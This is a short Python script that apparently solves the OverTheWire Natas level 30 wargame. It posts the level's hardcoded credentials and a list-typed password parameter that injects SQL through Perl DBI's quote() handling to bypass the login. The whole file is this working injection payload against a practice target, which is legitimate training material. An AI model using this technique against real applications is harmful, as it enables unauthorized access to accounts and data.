import requests
auth = requests.auth.HTTPBasicAuth("natas30","wie9iexae0Daihohv8vuu3cei9wahf0e")
url = "http://natas30.natas.labs.overthewire.org/index.pl"
params={"username": "natas31", "password": ["'skipping' or 1",4]}
response = requests.post(url,auth=auth,data=params)
print response.text
